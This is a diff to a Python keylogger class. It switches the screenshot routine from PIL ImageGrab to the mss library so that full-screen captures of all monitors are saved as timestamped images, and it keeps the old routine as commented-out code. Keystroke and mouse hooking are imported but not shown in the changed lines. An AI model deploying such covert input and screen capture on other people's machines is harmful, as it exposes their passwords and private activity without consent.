@@ -2,12 +2,12 @@ import os
 import re
 import time
 import tkinter as tk
-# from cmath import log
 from datetime import datetime as date
 from threading import Thread
 
 import pynput
-from PIL import ImageGrab
+from mss import mss
+from PIL import Image, ImageGrab
 from pynput.keyboard import Key
 from pynput.mouse import Button as MouseButton
 
@@ -17,6 +17,7 @@ from ui import Application
 class Keylogger():
     def __init__(self, logging):
         self.logging = logging
+        self.sct = mss()
         self.initial()
 
     def initial(self):
@@ -99,15 +100,30 @@ class Keylogger():
         self.current_time = time.time()
 
     def take_screenshot(self):
-        image_size = (1536, 864)
-        snapshot = ImageGrab.grab()
-        snapshot = snapshot.resize(image_size)
+        # with mss() as sct:
+        monitor = self.sct.monitors[0]
+        sct_img = self.sct.grab(monitor)
+        img = Image.frombytes('RGB', sct_img.size, sct_img.bgra, 'raw', 'BGRX')
+        
         screenshot_stamp = str(date.now()).replace(" ", "=")
         screenshot_stamp = screenshot_stamp.replace(":", "_")
+        
         if not os.path.isdir('Images'):
             os.mkdir('Images')
+        
         save_path = f"Images\\{screenshot_stamp}.jpg"
-        snapshot.save(save_path)
+        img.save(save_path)
+
+    # def take_screenshot(self):
+    #     image_size = (1536, 864)
+    #     snapshot = ImageGrab.grab()
+    #     snapshot = snapshot.resize(image_size)
+    #     screenshot_stamp = str(date.now()).replace(" ", "=")
+    #     screenshot_stamp = screenshot_stamp.replace(":", "_")
+    #     if not os.path.isdir('Images'):
+    #         os.mkdir('Images')
+    #     save_path = f"Images\\{screenshot_stamp}.jpg"
+    #     snapshot.save(save_path)
 
     def on_click(self, x, y, button, pressed):
         if button == MouseButton.left and pressed and self.logging:
